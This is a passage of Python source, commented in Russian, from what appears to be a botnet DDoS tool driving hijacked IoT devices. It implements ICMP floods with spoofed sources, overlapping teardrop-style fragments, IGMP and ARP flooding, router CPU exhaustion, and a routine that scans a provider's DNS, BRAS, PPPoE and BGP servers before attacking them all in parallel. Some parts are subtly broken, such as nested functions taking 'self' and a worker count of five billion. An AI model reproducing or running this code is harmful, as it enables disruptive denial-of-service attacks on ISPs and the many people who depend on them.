        iot_bots = [d for d in self.iot_bots if d.is_alive]
        
        if not iot_bots:
            print("❌ Нет доступных IoT устройств для комплексной атаки!")
            return None
        
        attack_stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'failed_packets': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def create_real_icmp_packet():
            """Создает настоящий ICMP Echo Request пакет"""
            icmp_type = 8  # Echo Request
            icmp_code = 0
            icmp_checksum = 0
            icmp_id = random.randint(1, 65535)
            icmp_seq = random.randint(1, 65535)
            
            # Payload
            payload = b'X' * 56
            
            # Собираем пакет без checksum
            packet = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq) + payload
            
            # Вычисляем checksum
            checksum = self._calculate_checksum(packet)
            
            # Пересобираем с правильным checksum
            packet = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq) + payload
            
            return packet
        
        def create_ip_fragments(source_ip, dest_ip, data, fragment_size=1480):
            """Создает настоящие IP фрагменты"""
            fragments = []
            ip_id = random.randint(1, 65535)
            offset = 0
            
            while offset < len(data):
                # Определяем флаги: MF=1 если есть еще фрагменты
                mf_flag = 1 if offset + fragment_size < len(data) else 0
                fragment_data = data[offset:offset + fragment_size]
                
                # Создаем IP header с фрагментацией
                ip_header = self._create_ip_header_with_fragmentation(
                    source_ip=source_ip,
                    dest_ip=dest_ip,
                    data_length=len(fragment_data),
                    protocol=socket.IPPROTO_ICMP,
                    identification=ip_id,
                    fragment_offset=offset // 8,  # Offset в 8-байтных блоках
                    more_fragments=mf_flag
                )
                
                fragment_packet = ip_header + fragment_data
                fragments.append(fragment_packet)
                offset += fragment_size
            
            return fragments
        
        def _create_ip_header_with_fragmentation(self, source_ip, dest_ip, data_length, protocol, 
                                               identification, fragment_offset, more_fragments):
            """Создает IP header с поддержкой фрагментации"""
            version_ihl = 0x45  # IPv4, IHL=5
            tos = 0
            total_length = 20 + data_length
            flags_fragment = (more_fragments << 13) | fragment_offset
            ttl = 255
            ip_checksum = 0
            source_addr = socket.inet_aton(source_ip)
            dest_addr = socket.inet_aton(dest_ip)
            
            # IP header без checksum
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                  version_ihl, tos, total_length, identification,
                                  flags_fragment, ttl, protocol, ip_checksum,
                                  source_addr, dest_addr)
            
            # Вычисляем checksum
            ip_checksum = self._calculate_checksum(ip_header)
            
            # Пересобираем с checksum
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                  version_ihl, tos, total_length, identification,
                                  flags_fragment, ttl, protocol, ip_checksum,
                                  source_addr, dest_addr)
            
            return ip_header
        
        def network_infrastructure_attack(device):
            """Реальная комплексная атака на инфраструктуру"""
            packets_sent = 0
            bytes_sent = 0
            failed_packets = 0
            
            try:
                print(f"💥 {device.ip} начинает реальную комплексную атаку...")
                start_time = time.time()
                
                # Создаем raw socket для отправки кастомных пакетов
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                sequence_number = 1
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Чередуем типы атак
                        attack_type = random.choice(['icmp_flood', 'fragmentation', 'mixed'])
                        
                        if attack_type == 'icmp_flood':
                            # 1. ICMP Flood
                            icmp_packet = create_real_icmp_packet()
                            ip_packet = self._create_ip_header_simple(
                                source_ip=device.ip,  # Или спуфинг source IP
                                dest_ip=target_ip,
                                data_length=len(icmp_packet),
                                protocol=socket.IPPROTO_ICMP
                            )
                            full_packet = ip_packet + icmp_packet
                            sock.sendto(full_packet, (target_ip, 0))
                            bytes_sent += len(full_packet)
                            
                        elif attack_type == 'fragmentation':
                            # 2. IP Fragmentation Attack
                            large_payload = b'F' * 3000  # Большой пакет для фрагментации
                            fragments = create_ip_fragments(device.ip, target_ip, large_payload)
                            
                            # Отправляем фрагменты
                            for fragment in fragments[:5]:  # Ограничиваем количество фрагментов
                                sock.sendto(fragment, (target_ip, 0))
                                bytes_sent += len(fragment)
                                packets_sent += 1
                                time.sleep(0.01)  # Задержка между фрагментами
                        
                        else:  # mixed
                            # 3. Смешанная атака
                            if random.random() > 0.5:
                                icmp_packet = create_real_icmp_packet()
                                ip_packet = self._create_ip_header_simple(device.ip, target_ip, 
                                                                        len(icmp_packet), socket.IPPROTO_ICMP)
                                sock.sendto(ip_packet + icmp_packet, (target_ip, 0))
                                bytes_sent += len(ip_packet + icmp_packet)
                            else:
                                # UDP flood для разнообразия
                                udp_payload = b'U' * random.randint(100, 1000)
                                udp_packet = self._create_udp_packet_simple(device.ip, target_ip, 
                                                                           random.randint(1024, 65535), 
                                                                           random.randint(1, 65535), 
                                                                           udp_payload)
                                sock.sendto(udp_packet, (target_ip, 0))
                                bytes_sent += len(udp_packet)
                        
                        packets_sent += 1
                        attack_stats['total_packets'] += 1
                        attack_stats['total_bytes'] += bytes_sent / max(packets_sent, 1)
                        
                        # Реалистичная скорость
                        time.sleep(random.uniform(0.01, 0.1))
                        
                    except Exception as e:
                        failed_packets += 1
                        attack_stats['failed_packets'] += 1
                        continue
                
                sock.close()
                
                mb_sent = bytes_sent / 1024 / 1024
                print(f"✅ {device.ip} завершил атаку: {packets_sent} пакетов ({mb_sent:.2f} MB)")
                return packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        # Запускаем атаку
        results = self._run_attack(iot_bots, attack_stats, network_infrastructure_attack, 
                                  "ICMP Black Hole Attack", max_workers=5000000000)
        
        print(f"🎯 Комплексная атака завершена. Итоги:")
        print(f"📦 Всего пакетов: {attack_stats['total_packets']}")
        print(f"💾 Всего данных: {attack_stats['total_bytes'] / 1024 / 1024:.2f} MB")
        print(f"❌ Ошибок: {attack_stats['failed_packets']}")
        
        return results

    # ДОБАВИТЬ В КЛАСС вспомогательные методы:
    def _create_ip_header_simple(self, source_ip, dest_ip, data_length, protocol):
        """Создает простой IP header"""
        version_ihl = 0x45
        tos = 0
        total_length = 20 + data_length
        identification = random.randint(1, 65535)
        flags_fragment = 0
        ttl = 255
        checksum = 0
        source_addr = socket.inet_aton(source_ip)
        dest_addr = socket.inet_aton(dest_ip)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              version_ihl, tos, total_length, identification,
                              flags_fragment, ttl, protocol, checksum,
                              source_addr, dest_addr)
        
        checksum = self._calculate_checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBH4s4s',
                              version_ihl, tos, total_length, identification,
                              flags_fragment, ttl, protocol, checksum,
                              source_addr, dest_addr)
        return ip_header

    def _create_udp_packet_simple(self, source_ip, dest_ip, source_port, dest_port, data):
        """Создает UDP пакет"""
        # UDP header
        udp_length = 8 + len(data)
        udp_checksum = 0
        
        udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_checksum)
        udp_packet = udp_header + data
        
        # IP header
        ip_packet = self._create_ip_header_simple(source_ip, dest_ip, len(udp_packet), socket.IPPROTO_UDP)
        
        return ip_packet + udp_packet

    def blackhole_attack(self, target_ip, duration=60):
        """КОМПЛЕКСНАЯ СЕТЕВАЯ АТАКА BLACKHOLE:
        - ICMP Flood
        - IP Fragmentation Overload  
        - IGMP Membership Bombing
        - ARP Table Exhaustion
        - Router CPU Exhaustion
        """
        print(f"🕳️ ЗАПУСК BLACKHOLE АТАКИ НА {target_ip}")
        print("💀 Комбинированная атака на сетевую инфраструктуру")
        
        # Проверка raw socket доступа
        if not self.raw_socket_available:
            print("❌ Требуются права root для BLACKHOLE атаки!")
            return None
        
        # Используем только IoT устройства с raw socket доступом
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        
        if not iot_bots:
            print("❌ Нет доступных IoT устройств для BLACKHOLE атаки!")
            return None
        
        attack_stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'failed_packets': 0,
            'icmp_packets': 0,
            'fragmented_packets': 0,
            'igmp_packets': 0,
            'arp_packets': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def create_icmp_flood_packet():
            """Создает ICMP Echo Request пакет"""
            icmp_type = 8  # Echo Request
            icmp_code = 0
            icmp_checksum = 0
            icmp_id = random.randint(1, 65535)
            icmp_seq = random.randint(1, 65535)
            
            # Payload с временной меткой
            timestamp = struct.pack('!d', time.time())
            padding = os.urandom(48)
            data = timestamp + padding
            
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
            icmp_checksum = self._calculate_checksum(icmp_header + data)
            icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
            
            return icmp_header + data

        def create_ip_fragments(source_ip, dest_ip, data, fragment_size=8):
            """Создает перекрывающиеся IP фрагменты для атаки на реасемблирование"""
            fragments = []
            ip_id = random.randint(1, 65535)
            
            # Создаем фрагменты с перекрытием
            offset = 0
            while offset < len(data):
                # MF=1 для всех кроме последнего фрагмента
                mf_flag = 1 if offset + fragment_size < len(data) else 0
                fragment_data = data[offset:offset + fragment_size]
                
                # Специально создаем перекрывающиеся offset
                frag_offset = max(0, offset // 8 - random.randint(0, 2))
                
                ip_header = self._create_ip_header_with_fragmentation(
                    source_ip=source_ip,
                    dest_ip=dest_ip,
                    data_length=len(fragment_data),
                    protocol=socket.IPPROTO_ICMP,
                    identification=ip_id,
                    fragment_offset=frag_offset,
                    more_fragments=mf_flag
                )
                
                fragments.append(ip_header + fragment_data)
                offset += fragment_size - random.randint(0, 2)  # Перекрытие
            
            return fragments

        def create_igmp_membership_report():
            """Создает IGMP Membership Report пакет"""
            igmp_type = 0x16  # Version 2 Membership Report
            igmp_code = 0
            igmp_checksum = 0
            igmp_group = socket.inet_aton("224.0.0." + str(random.randint(1, 255)))
            
            igmp_header = struct.pack('!BBH4s', igmp_type, igmp_code, igmp_checksum, igmp_group)
            igmp_checksum = self._calculate_checksum(igmp_header)
            igmp_header = struct.pack('!BBH4s', igmp_type, igmp_code, igmp_checksum, igmp_group)
            
            return igmp_header

        def create_arp_packet(source_ip, dest_ip, source_mac=None):
            """Создает ARP пакет для истощения таблицы ARP"""
            if source_mac is None:
                source_mac = bytes([0x00, 0x16, 0x3e, 
                                  random.randint(0x00, 0x7f), 
                                  random.randint(0x00, 0xff), 
                                  random.randint(0x00, 0xff)])
            
            # ARP Request
            hardware_type = 0x0001  # Ethernet
            protocol_type = 0x0800  # IP
            hardware_size = 6
            protocol_size = 4
            opcode = 0x0001  # Request
            
            # Случайный целевой MAC
            target_mac = bytes([random.randint(0x00, 0xff) for _ in range(6)])
            target_ip = socket.inet_aton(dest_ip)
            
            arp_packet = struct.pack('!HHBBH6s4s6s4s', 
                                   hardware_type, protocol_type, hardware_size, protocol_size,
                                   opcode, source_mac, socket.inet_aton(source_ip), 
                                   target_mac, target_ip)
            
            return arp_packet

        def create_router_cpu_exhaustion_packets(target_ip):
            """Создает пакеты для атаки на CPU маршрутизатора"""
            packets = []
            
            # 1. Пакеты с TTL=1 (заставляют router отправлять ICMP Time Exceeded)
            for _ in range(5):
                icmp_packet = create_icmp_flood_packet()
                ip_header = self._create_ip_header_simple(
                    source_ip=".".join(str(random.randint(1, 254)) for _ in range(4)),
                    dest_ip=target_ip,
                    data_length=len(icmp_packet),
                    protocol=socket.IPPROTO_ICMP
                )
                packets.append(ip_header + icmp_packet)
            
            # 2. Пакеты с опциями IP (требуют дополнительной обработки)
            ip_options = b'\x07\x04\x00\x00\x00\x00'  # Record Route option
            packets.append(self._create_ip_header_with_options(
                source_ip=".".join(str(random.randint(1, 254)) for _ in range(4)),
                dest_ip=target_ip,
                data=b'X' * 100,
                protocol=socket.IPPROTO_UDP,
                options=ip_options
            ))
            
            return packets

        def _create_ip_header_with_options(self, source_ip, dest_ip, data, protocol, options):
            """Создает IP header с опциями"""
            version_ihl = 0x45  # IPv4, IHL=5 (20 bytes) + options
            tos = 0
            total_length = 20 + len(options) + len(data)
            identification = random.randint(1, 65535)
            flags_fragment = 0
            ttl = 1  # TTL=1 для генерации ICMP Time Exceeded
            checksum = 0
            source_addr = socket.inet_aton(source_ip)
            dest_addr = socket.inet_aton(dest_ip)
            
            # Базовый header без options
            ip_header = struct.pack('!BBHHHBBH4s4s',
                                  version_ihl, tos, total_length, identification,
                                  flags_fragment, ttl, protocol, checksum,
                                  source_addr, dest_addr)
            
            # Добавляем options
            ip_header_with_options = ip_header[:0] + options
            
            # Пересчитываем checksum
            checksum = self._calculate_checksum(ip_header_with_options)
            ip_header_with_options = struct.pack('!BBHHHBBH4s4s',
                                              version_ihl, tos, total_length, identification,
                                              flags_fragment, ttl, protocol, checksum,
                                              source_addr, dest_addr) + options
            
            return ip_header_with_options + data

        def blackhole_attack_single(device):
            """Комплексная атака для одного устройства"""
            packets_sent = 0
            bytes_sent = 0
            failed_packets = 0
            
            try:
                print(f"💀 {device.ip} начинает BLACKHOLE атаку...")
                start_time = time.time()
                
                # Создаем raw socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                attack_sequence = 0
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        attack_sequence = (attack_sequence + 1) % 5
                        
                        if attack_sequence == 0:
                            # 1. ICMP FLOOD
                            icmp_packet = create_icmp_flood_packet()
                            source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                            
                            ip_packet = self._create_ip_header_simple(
                                source_ip=source_ip,
                                dest_ip=target_ip,
                                data_length=len(icmp_packet),
                                protocol=socket.IPPROTO_ICMP
                            )
                            
                            sock.sendto(ip_packet + icmp_packet, (target_ip, 0))
                            packets_sent += 1
                            attack_stats['icmp_packets'] += 1
                            
                        elif attack_sequence == 1:
                            # 2. IP FRAGMENTATION OVERLOAD
                            large_payload = b'F' * 5000
                            source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                            
                            fragments = create_ip_fragments(source_ip, target_ip, large_payload)
                            
                            # Отправляем только первые несколько фрагментов (teardrop-like)
                            for fragment in fragments[:3]:
                                sock.sendto(fragment, (target_ip, 0))
                                packets_sent += 1
                                attack_stats['fragmented_packets'] += 1
                                time.sleep(0.001)
                                
                        elif attack_sequence == 2:
                            # 3. IGMP MEMBERSHIP BOMBING
                            igmp_packet = create_igmp_membership_report()
                            source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                            
                            ip_packet = self._create_ip_header_simple(
                                source_ip=source_ip,
                                dest_ip="224.0.0.1",  # Multicast
                                data_length=len(igmp_packet),
                                protocol=socket.IPPROTO_IGMP
                            )
                            
                            sock.sendto(ip_packet + igmp_packet, ("224.0.0.1", 0))
                            packets_sent += 1
                            attack_stats['igmp_packets'] += 1
                            
                        elif attack_sequence == 3:
                            # 4. ARP TABLE EXHAUSTION (локальная сеть)
                            if target_ip.startswith(('192.168.', '10.', '172.')):
                                source_ip = ".".join([target_ip.split('.')[0], 
                                                   target_ip.split('.')[1], 
                                                   str(random.randint(1, 254)),
                                                   str(random.randint(1, 254))])
                                
                                arp_packet = create_arp_packet(source_ip, target_ip)
                                
                                # Для ARP используем Ethernet frame (упрощенная версия)
                                try:
                                    arp_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
                                    arp_sock.bind(('eth0', 0))
                                    
                                    # Ethernet frame для ARP
                                    dest_mac = b'\xff\xff\xff\xff\xff\xff'  # Broadcast
                                    src_mac = bytes([random.randint(0x00, 0xff) for _ in range(6)])
                                    eth_type = b'\x08\x06'  # ARP
                                    
                                    eth_frame = dest_mac + src_mac + eth_type + arp_packet
                                    arp_sock.send(eth_frame)
                                    
                                    packets_sent += 1
                                    attack_stats['arp_packets'] += 1
                                    arp_sock.close()
                                except:
                                    pass
                                    
                        else:
                            # 5. ROUTER CPU EXHAUSTION
                            cpu_packets = create_router_cpu_exhaustion_packets(target_ip)
                            
                            for packet in cpu_packets:
                                sock.sendto(packet, (target_ip, 0))
                                packets_sent += 1
                        
                        attack_stats['total_packets'] += 1
                        bytes_sent += 100  # Примерный размер пакета
                        
                        # Агрессивная отправка
                        time.sleep(0.001)
                        
                    except Exception as e:
                        failed_packets += 1
                        attack_stats['failed_packets'] += 1
                        continue
                
                sock.close()
                
                print(f"✅ {device.ip} завершил BLACKHOLE: {packets_sent} пакетов")
                return packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        # Запускаем атаку
        results = self._run_attack(iot_bots, attack_stats, blackhole_attack_single, 
                                  "BLACKHOLE", max_workers=min(len(iot_bots), 5000000000))
        
        # Детальная статистика
        print(f"\n💀 BLACKHOLE АТАКА РЕЗУЛЬТАТЫ:")
        print(f"📦 Всего пакетов: {attack_stats['total_packets']}")
        print(f"   🎯 ICMP Flood: {attack_stats['icmp_packets']}")
        print(f"   🔧 IP Fragmentation: {attack_stats['fragmented_packets']}") 
        print(f"   📡 IGMP Bombing: {attack_stats['igmp_packets']}")
        print(f"   🔗 ARP Exhaustion: {attack_stats['arp_packets']}")
        print(f"   💻 Router CPU: {attack_stats['total_packets'] - sum([attack_stats['icmp_packets'], attack_stats['fragmented_packets'], attack_stats['igmp_packets'], attack_stats['arp_packets']])}")
        print(f"💾 Данных: {attack_stats['total_bytes'] / 1024 / 1024:.2f} MB")
        print(f"❌ Ошибок: {attack_stats['failed_packets']}")
        
        return results

    def isp_target_discovery(self, target_ip):
        """
        Обнаружение критической инфраструктуры провайдера по IP
        """
        print(f"🔍 Анализ инфраструктуры провайдера для IP: {target_ip}")
        
        isp_info = {
            'bras_servers': [],
            'dns_servers': [],
            'pppoe_servers': [],
            'bgp_routers': [],
            'network_blocks': [],
            'other_critical': []
        }
        
        try:
            # 1. WHOIS информация о IP
            print("📊 Получение WHOIS информации...")
            try:
                whois_info = whois.whois(target_ip)
                
                if whois_info:
                    # Извлекаем сетевые блоки провайдера
                    if hasattr(whois_info, 'nets') and whois_info.nets:
                        for net in whois_info.nets:
                            if hasattr(net, 'cidr'):
                                isp_info['network_blocks'].append(str(net.cidr))
                                print(f"✅ Найден сетевой блок: {net.cidr}")
                    
                    # Пытаемся извлечь имя провайдера
                    provider_name = ""
                    if whois_info.org:
                        provider_name = whois_info.org
                    elif whois_info.asn:
                        provider_name = f"AS{whois_info.asn}"
                    
                    if provider_name:
                        print(f"🏢 Провайдер: {provider_name}")
            except Exception as e:
                print(f"⚠️ Ошибка WHOIS: {e}")
            
            # 2. Поиск DNS серверов провайдера
            isp_info['dns_servers'].extend(self._find_isp_dns_servers(target_ip))
            
            # 3. Поиск BRAS серверов
            isp_info['bras_servers'].extend(self._find_bras_servers(target_ip))
            
            # 4. Поиск PPPoE серверов
            isp_info['pppoe_servers'].extend(self._find_pppoe_servers(target_ip))
            
            # 5. Поиск BGP маршрутизаторов
            isp_info['bgp_routers'].extend(self._find_bgp_routers(target_ip))
            
        except Exception as e:
            print(f"❌ Ошибка анализа провайдера: {e}")
        
        # Вывод результатов
        self._print_isp_discovery_results(isp_info)
        return isp_info

    def _find_isp_dns_servers(self, target_ip):
        """Поиск DNS серверов провайдера"""
        dns_servers = []
        
        # Попробуем найти DNS через стандартные методы
        common_dns_ports = [53, 5353]
        
        # Проверяем стандартные IP в сети
        try:
            ip_parts = target_ip.split('.')
            network_base = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
            
            # Проверяем возможные DNS серверы в сети
            potential_dns_ips = [
                f"{network_base}.1",  # Шлюз
                f"{network_base}.253",
                f"{network_base}.254",
                f"{network_base}.100",
                target_ip  # Сам целевой IP
            ]
            
            for ip in potential_dns_ips:
                for port in common_dns_ports:
                    if self._check_dns_service(ip, port):
                        dns_servers.append(ip)
                        print(f"✅ Найден DNS сервер: {ip}:{port}")
                        break
                    
        except Exception as e:
            print(f"⚠️ Ошибка поиска DNS: {e}")
        
        return list(set(dns_servers))

    def _check_dns_service(self, ip, port, timeout=2):
        """Проверяет DNS сервис"""
        try:
            # Пробуем отправить DNS запрос
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            
            # Простой DNS запрос
            dns_query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
            sock.sendto(dns_query, (ip, port))
            
            try:
                response = sock.recv(1024)
                return len(response) > 0
            except socket.timeout:
                # Проверяем TCP соединение для DNS-over-TCP
                try:
                    sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock_tcp.settimeout(timeout)
                    result = sock_tcp.connect_ex((ip, port))
                    sock_tcp.close()
                    return result == 0
                except:
                    return False
            finally:
                sock.close()
                
        except:
            return False

    def _find_bras_servers(self, target_ip):
        """Поиск BRAS серверов провайдера"""
        bras_servers = []
        
        try:
            # Простая эвристика для поиска BRAS серверов
            ip_parts = target_ip.split('.')
            network_base = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
            
            # Типичные IP BRAS серверов
            potential_bras_ips = [
                f"{network_base}.1",    # Шлюз
                f"{network_base}.254",  # Часто BRAS
                f"{network_base}.253",
                f"{network_base}.100",
                f"{network_base}.200"
            ]
            
            # Проверяем доступность на BRAS портах
            bras_ports = [2000, 2001, 2002, 3000, 3001]
            
            for ip in potential_bras_ips:
                if self._check_service_availability(ip, bras_ports):
                    bras_servers.append(ip)
                    
        except Exception as e:
            print(f"⚠️ Ошибка поиска BRAS: {e}")
        
        return bras_servers

    def _find_pppoe_servers(self, target_ip):
        """Поиск PPPoE серверов аутентификации"""
        pppoe_servers = []
        
        try:
            ip_parts = target_ip.split('.')
            network_base = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
            
            potential_pppoe_ips = [
                f"{network_base}.1",
                f"{network_base}.254", 
                f"{network_base}.100"
            ]
            
            pppoe_ports = [1723, 1812, 1813]  # PPPoE и RADIUS порты
            
            for ip in potential_pppoe_ips:
                if self._check_service_availability(ip, pppoe_ports):
                    pppoe_servers.append(ip)
                    
        except Exception as e:
            print(f"⚠️ Ошибка поиска PPPoE: {e}")
        
        return pppoe_servers

    def _find_bgp_routers(self, target_ip):
        """Поиск BGP маршрутизаторов"""
        bgp_routers = []
        
        try:
            ip_parts = target_ip.split('.')
            network_base = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
            
            potential_bgp_ips = [
                f"{network_base}.1",
                f"{network_base}.254"
            ]
            
            # Проверяем BGP порт 179
            for ip in potential_bgp_ips:
                if self._check_port_availability(ip, 179):
                    bgp_routers.append(ip)
                    
        except Exception as e:
            print(f"⚠️ Ошибка поиска BGP: {e}")
        
        return bgp_routers

    def _scan_local_network(self, target_ip):
        """Сканирование локальной сети на наличие критической инфраструктуры"""
        results = {
            'local_servers': [],
            'network_equipment': [],
            'gateways': []
        }
        
        try:
            # Определение сети /24
            network = ipaddress.IPv4Network(target_ip + '/24', strict=False)
            
            print(f"🔍 Сканирование сети {network}...")
            
            # Быстрое сканирование ключевых IP
            key_ips = [
                str(network.network_address + 1),  # Обычно шлюз
                str(network.broadcast_address - 1),  # Часто сервер
                str(network.network_address + 254)  # Еще один кандидат
            ]
            
            # Добавляем стандартные шлюзы
            for i in [1, 100, 200, 254]:
                key_ips.append(str(network.network_address + i))
            
            for ip in set(key_ips):
                if self._check_critical_service(ip):
                    results['local_servers'].append(ip)
                    print(f"✅ Найден критический сервер: {ip}")
                
                if self._check_gateway(ip):
                    results['gateways'].append(ip)
                    print(f"✅ Найден шлюз: {ip}")
        
        except Exception as e:
            print(f"❌ Ошибка сканирования сети: {e}")
        
        return results

    def _recursive_dns_discovery(self, target_ip):
        """Рекурсивный DNS поиск связанных серверов"""
        results = {
            'related_hosts': [],
            'mail_servers': [],
            'web_servers': []
        }
        
        try:
            # Обратный DNS lookup
            try:
                reverse_dns = dns.reversename.from_address(target_ip)
                answers = dns.resolver.resolve(reverse_dns, 'PTR')
                for answer in answers:
                    hostname = str(answer)
                    print(f"🔗 Обратный DNS: {target_ip} -> {hostname}")
                    
                    # Дополнительный поиск для этого hostname
                    try:
                        a_answers = dns.resolver.resolve(hostname, 'A')
                        for a_answer in a_answers:
                            results['related_hosts'].append(str(a_answer))
                    except:
                        pass
            except:
                pass
            
            # Поиск MX записей (почтовые серверы)
            try:
                domain = target_ip.rsplit('.', 1)[0] + '.com'  # Пример домена
                mx_answers = dns.resolver.resolve(domain, 'MX')
                for mx in mx_answers:
                    mx_host = str(mx.exchange).rstrip('.')
                    try:
                        a_answers = dns.resolver.resolve(mx_host, 'A')
                        for a_answer in a_answers:
                            results['mail_servers'].append(str(a_answer))
                    except:
                        pass
            except:
                pass
                
        except Exception as e:
            print(f"❌ Ошибка рекурсивного DNS: {e}")
        
        return results

    def _check_service_availability(self, ip, ports, timeout=2):
        """Проверка доступности сервисов на указанных портах"""
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    return True
            except:
                continue
        return False

    def _check_bgp_service(self, ip, timeout=2):
        """Специфическая проверка BGP сервиса"""
        try:
            # Проверка порта BGP (179)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, 179))
            sock.close()
            return result == 0
        except:
            return False

    def _check_critical_service(self, ip, timeout=1):
        """Проверка критических сервисов"""
        critical_ports = [22, 23, 80, 443, 8080, 8443, 1723, 179, 2000, 3000]
        return self._check_service_availability(ip, critical_ports, timeout)

    def _check_gateway(self, ip, timeout=1):
        """Проверка, является ли IP сетевым шлюзом"""
        # Шлюзы часто отвечают на ICMP и имеют открытые специфичные порты
        try:
            # ICMP ping
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(timeout)
            # Упрощенная проверка
            return self._check_service_availability(ip, [80, 443, 22], timeout)
        except:
            return False

    def _print_isp_discovery_results(self, isp_info):
        """Вывод результатов обнаружения инфраструктуры"""
        print("\n" + "="*60)
        print("🎯 РЕЗУЛЬТАТЫ ОБНАРУЖЕНИЯ ИНФРАСТРУКТУРЫ ПРОВАЙДЕРА")
        print("="*60)
        
        for category, servers in isp_info.items():
            if servers:
                print(f"\n📋 {category.upper().replace('_', ' ')}:")
                for server in servers:
                    print(f"   ✅ {server}")
            else:
                print(f"\n📋 {category.upper().replace('_', ' ')}: Не найдено")

    def isp_flood(self, target_ip, duration=60):
        """
        КОМПЛЕКСНАЯ АТАКА НА ИНФРАСТРУКТУРУ ПРОВАЙДЕРА
        Объединяет все компоненты для максимального воздействия
        """
        print(f"🌐 ЗАПУСК КОМПЛЕКСНОЙ ISP АТАКИ НА {target_ip}")
        print("💀 Атака на всю инфраструктуру провайдера одновременно!")
        
        # 1. ОБНАРУЖЕНИЕ ИНФРАСТРУКТУРЫ
        print("🔍 Этап 1: Обнаружение инфраструктуры провайдера...")
        isp_info = self.isp_target_discovery(target_ip)
        
        # 2. ПОДГОТОВКА ЦЕЛЕЙ ДЛЯ АТАКИ
        all_targets = []
        
        # DNS серверы
        for dns_ip in isp_info.get('dns_servers', []):
            all_targets.append(('DNS', dns_ip, 53))
        
        # BRAS серверы
        for bras_ip in isp_info.get('bras_servers', []):
            for port in [2000, 2001, 2002, 3000, 3001]:
                all_targets.append(('BRAS', bras_ip, port))
        
        # PPPoE серверы
        for pppoe_ip in isp_info.get('pppoe_servers', []):
            all_targets.append(('PPPoE', pppoe_ip, 1723))
        
        # BGP маршрутизаторы
        for bgp_ip in isp_info.get('bgp_routers', []):
            all_targets.append(('BGP', bgp_ip, 179))
        
        # Если не нашли специфичные цели, используем стандартные
        if not all_targets:
            print("⚠️ Специфичные цели не найдены, используем стандартные атаки")
            all_targets = [
                ('MAIN', target_ip, 80),
                ('MAIN', target_ip, 443),
                ('DNS', target_ip, 53),
                ('INFRA', target_ip, 22)
            ]
        
        print(f"🎯 Найдено целей для атаки: {len(all_targets)}")
        
        # 3. ЗАПУСК ПАРАЛЛЕЛЬНЫХ АТАК
        attack_stats = {
            'total_targets': len(all_targets),
            'successful_attacks': 0,
            'failed_attacks': 0,
            'start_time': time.time()
        }
        
        def attack_single_target(target_info):
            """Атака одной цели"""
            target_type, target_ip, target_port = target_info
            
            try:
                print(f"💥 Атакуем {target_type} {target_ip}:{target_port}")
                
                # Выбор метода атаки в зависимости от типа цели
                if target_type == 'DNS':
                    return self.dns_amplification_attack(target_ip, target_port, duration//2)
                elif target_type == 'BRAS':
                    return self.tcp_connection_flood(target_ip, target_port, duration//3)
                elif target_type == 'PPPoE':
                    return self.udp_flood_attack(target_ip, target_port, duration//3)
                elif target_type == 'BGP':
                    return self.tcp_connection_flood(target_ip, target_port, duration//4)
                else:
                    # Комбинированная атака для остальных целей
                    results = []
                    results.append(self.tcp_connection_flood(target_ip, target_port, duration//5))
                    results.append(self.http_get_flood(target_ip, target_port, False, duration//5))
                    results.append(self.udp_flood_attack(target_ip, target_port, duration//5))
                    
                    return sum([r for r in results if r])
                
            except Exception as e:
                print(f"❌ Ошибка атаки {target_ip}:{target_port}: {e}")
                return 0
        
        # Запуск атак на все цели параллельно
        with ThreadPoolExecutor(max_workers=min(len(all_targets), self.max_threads)) as executor:
            futures = [executor.submit(attack_single_target, target) for target in all_targets]
            
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=duration + 30)
                    if result > 0:
                        attack_stats['successful_attacks'] += 1
                    else:
                        attack_stats['failed_attacks'] += 1
                except:
                    attack_stats['failed_attacks'] += 1
        
        # 4. ФИНАЛЬНАЯ СТАТИСТИКА
